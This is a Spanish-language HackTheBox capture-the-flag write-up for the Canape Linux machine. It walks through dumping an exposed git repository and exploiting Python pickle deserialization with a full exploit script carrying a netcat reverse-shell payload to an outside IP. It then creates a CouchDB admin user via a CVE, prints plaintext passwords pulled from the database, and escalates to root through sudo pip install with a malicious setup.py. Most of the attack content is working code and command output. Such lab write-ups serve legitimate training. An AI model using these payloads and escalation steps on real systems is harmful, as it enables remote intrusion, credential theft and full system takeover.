---
layout: single
title: Canape HTB - WriteUp
excerpt: WriteUp de la máquina Canape de HTB.
date: 2023-03-14
classes: wide
header:
  teaser: /assets/images/Canape/Canape.png
  teaser_home_page: true
  icon: /assets/images/Canape/Canape.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web
  - Git                                                                                                                                                                                    
  - Deserialization
  - CouchDB
---


En el día de hoy estaremos resolviendo la máquina Canape de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.10.70.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Git Dump](#git-dump)
3. [Python Code Analysis](#python-code-analysis)
4. [Pickle Deserialization](#pickle-deserialization)
5. [Get RevserseShell With Exploit](#get-revserseshell-with-exploit)
6. [Privesc To Homer](#privesc-to-homer)
7. [Privesc To Root](#privesc-to-root)


### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
# Nmap 7.91 scan initiated Tue Mar 14 12:39:00 2023 as: nmap -sC -sV -Pn -oN Extraction -p80,65535 10.10.10.70
Nmap scan report for 10.10.10.70
Host is up (0.048s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 14 12:39:10 2023 -- 1 IP address (1 host up) scanned in 10.72 seconds
```

Podemos ver que hay dos puertos abiertos, un SSH en el puerto 65535 y un servidor Web. Nmap nos reporta que hay un directorio .git expuesto. Vamos a descargarnos todo su contenido para acceder a lo que podría ser el código de la Web.


```bash
❯ wget --recursive http://10.10.10.70/.git/
```

### Git Dump

Ahora podemos ver los logs de los commits de la aplicación. Podemos hacerlo de la siguiente forma a través de la herramienta git.

```bash
❯ git log --oneline
92eb5eb (HEAD -> master) final
524f9dd final
999b869 remove a
a762ade a
f197cbf remove doh
36acc97 add doh
fb79852 remove f
64ed42c add f
7b15317 MORE TROLLS
a389475 trollface
f9be9a9 add note
c8a74a0 temporarily hide check due to vulerability
e7bfbcf initial
```

Hay varios commits, voy a visualizar el ulitmo commit para ver que se esta ejecutando en este momento por detrás en la web.

```bash
❯ git show 92eb5eb
commit 92eb5eb61f16b7b89be0a7ac0a6c2455d377bb41 (HEAD -> master)
Author: Your Name <you@example.com>
Date:   Tue Apr 10 13:26:06 2018 -0700

    final

diff --git a/__init__.py b/__init__.py
index 60a8e44..4471075 100644
--- a/__init__.py
+++ b/__init__.py
@@ -6,6 +6,7 @@ import cPickle
 from flask import Flask, render_template, request
 from hashlib import md5
 
+
 app = Flask(__name__)
 app.config.update(
     DATABASE = "simpsons"
```


### Python Code Analysis

Veo poca cosa, voy a usar git diff para ver los cambios de una forma mas visual. Podemos sacar el siguiente código.

```python
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5


app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

Vemos una aplicación montada en flask que permite subir "frases" de los Simpsons, se sigue  una whitelist de personajes para subir las frases, es decir, si ponemos un personaje no existente no debería poder hacer el POST. Vemos que se está usando cPickle para deserializar datos. Se puede ver que hay un endpoint llamado "/check" que permite hacerle una petición POST enviandole el id de los datos que hemos subido antes, el id se calcula sacando el HASH md5 de char + quote.

Vamos a verlo mas claro.

```bash
❯ curl  -s -X POST http://10.10.10.70/submit -d "character=homer&quote=test" | html2text

 Simpsons_Fan_Site
    * Home
    * Character_Quotes
    * Submit_Quote

****** Submit A Quote ******
Success! Thank you for your suggestion!  ×
[Submit]

===============================================================================
© Homer Simpson 2018
```

Hemos subido una frase para el usuario homer, vamos a ver si podemos acceder a su frase a traves de check.

```python
>>> from hashlib import md5
>>> md5(b"homer"+b"test").hexdigest()
'27c2ef5f95bbc3e5fddecf2f5ed9eb8c'
>>>
```

Una vez extraido el hash vamos a realizar la petición POST con curl.

```bash
❯ curl  -s -X POST http://10.10.10.70/check -d "id=27c2ef5f95bbc3e5fddecf2f5ed9eb8c"
Still reviewing: homertest
```


### Pickle Deserialization

Si nos fijamos en este trozo de código podemos sacar las siguientes conlusiones:

```python
 if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item
```

Si la data contiene la cadena "p1" se deserealiza ccon pickle en el caso contrario nos item=data y posteriormente nos muestra el mensaje que vimos en el paso anterior. Si probamos a hacer lo mismoq que antes pero que la frase lleve p1 recibiremos un Internal Server Error.

```bash
❯ curl  -s -X POST http://10.10.10.70/submit -d "character=homer&quote=p1" | html2text
 Simpsons_Fan_Site
    * Home
    * Character_Quotes
    * Submit_Quote

****** Submit A Quote ******
Success! Thank you for your suggestion!  ×
[Submit]


❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from hashlib import md5
>>> md5(b"homer"+b"p1").hexdigest()
'4ec582f774c3acb87b2433d82cbda7dd'


❯ curl  -s -X POST http://10.10.10.70/check -d "id=4ec582f774c3acb87b2433d82cbda7dd"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```


Además podemos observar  que la comprobación de la whitelist de personajes comprueba unicamente si la palabra se encuentra en la cadena de texto que introducimos. Podemos aprovecharnos de todo esto para explotar un ataque de deserialización. Pickle es una librería que permite serializar y deserializar datos, pero si la aplicación no está bien diseñada nos podemos aprovechar de esto. https://davidhamann.de/2020/04/05/exploiting-python-pickle/

Voy a explicar de una forma muy rápida como funciona todo esto. Nosotros tenemos el siguiente código en python para serealizar datos.


```python
import pickle,os

class Serealize(object):
        def __reduce__(self):
                return(os.system,("whoami",))
deserealized_payload = Serealize()
serealized_payload = pickle.dumps(deserealized_payload)
print (serealized_payload)
```

En este caso estamos creado los datos serializados, si ejecutamos el script podemos ver los siguiente:


```bash
❯ python2 test.py
cposix
system
p0
(S'whoami'
p1
tp2
Rp3
.
```

Podemos ver nuestro comando y "p1" por lo tanto se ejecutara el if que vimos anteriormente y hara uso de la función loads. Veamos que pasa si se llama a esa función.

```bash
import pickle,os
class Serealize(object):
        def __reduce__(self):
                return(os.system,("whoami",))

deserealized_payload = Serealize()

serealized_payload = pickle.dumps(deserealized_payload)

pickle.loads(serealized_payload)
```

Si ejecutamos el script veremos lo que ocurre:

```bash
❯ python2 test.py
root
```

### Get ReverseShell With Exploit

Todo esto es gracias a la función \_\_reduce\_\_ de la cual podemos aprovecharnos para cargar comandos... Todo esto que hemos visto aplicado a la web quedaría de la siguiente forma en un script.

```python
#!/usr/bin/python
import os,pickle,requests
from hashlib import md5


url_submit="http://10.10.10.70/submit"
url_check="http://10.10.10.70/check"
proxies={"http":"http://127.0.0.1:8080"}


class PickleRce(object):
    def __reduce__(self):
        return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 443 >/tmp/f; homer',))

pickle_data = pickle.dumps(PickleRce())

def deserialization_request():

        quote="test"

        data={
                "character":pickle_data,
                "quote":quote

                }

        r1=requests.post(url_submit,data=data,proxies=proxies)


        print (pickle_data)


        hash=md5(pickle_data + quote).hexdigest()
        print (hash)


        data2={
                "id":hash
        }

        r2=requests.post(url_check, data=data2,proxies=proxies)


if __name__ == '__main__':

        deserialization_request()
```

Donde el pyalod debe llevar "; homer" (o el nombre de otro personaje para que haga el POST)

Esto ejecutara el primer comando y como segundo entraría homer que no existe y dará un error, pero esto no interfiere en la explotación.
Si ejecutamos el exploit deberiamos ganar una revshell como vemos acontinuación.

```bash
www-data@canape:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@canape:/tmp$
```

### Privesc To Homer

Hacemos el tratamiento de la tty y empezamos a enumerar. Si nos volvemos a fijar en el código fuente de la página podemos ver lo siguiente:

```python
app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]
```

Se está usando couchdb como motor de base de datos. Si miramos en hacktricks información al respecto podemos encontrar la siguiente:https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb

Vemos que se pueden hacer peticiones a traves de curl usando GET:

```bash
www-data@canape:/$ curl -X GET http://127.0.0.1:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
www-data@canape:/$
```

Podemos listar todas las bases de datos existentes, pero no podemos acceder a ellas:

```bash
www-data@canape:/$ curl -X GET http://127.0.0.1:5984/passwords
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

Nos hace falta un usuario autenticado... Si seguimos leyendo en hacktricks podemos ver que existe un CVE que permite crear un usuario administrador.

```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```

Si hacemos eso (podemos cambiar el username y el password) podremos autenticarnos en la bd y acceder a los datos.

```bash
www-data@canape:/$ curl -X GET http://hacktricks:hacktricks@127.0.0.1:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

Podemos ver las claves de los datos, vamos a acceder a ellos.

```bash
www-data@canape:/$ for i in $(curl -s -X GET http://hacktricks:hacktricks@127.0.0.1:5984/passwords/_all_docs | cut -d ':' -f 2 | cut -d ',' -f1 | tr -d '"');do curl http://hacktricks:hacktricks@localhost:5984/passwords/$i;done
{"error":"not_found","reason":"missing"}
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```


### Privesc To Root

Podemos ver un item llamado ssh con una password, puede que nos sirva para el usuario del sistema:

```bash
www-data@canape:/$ su homer
Password: 
homer@canape:/$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)
homer@canape:/$
```

Vamos a ver como seguir escalando privilegios, vamos a ver si tenemos permisos de sudo.

```bash
homer@canape:/$ sudo -l
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
homer@canape:/$ 
```

Podemos ejecutar pip  install como root sobre lo que sea. Para aprovecharnos de esto vamos a crear el siguiente archivo pip.

```python
import os 
os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')
```

Esto nos invocará una sh con privilegios de root. Vamos a tratar de ejecutarlo.

```bash
homer@canape:/tmp$ TF=$(mktemp -d)
homer@canape:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
homer@canape:/tmp$ sudo pip install $TF
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing ./tmp.cv7AmwjhZe
# 
uid=0(root) gid=0(root) groups=0(root)
```

Ya hemos pwneado la máquina, espero que te haya servido.



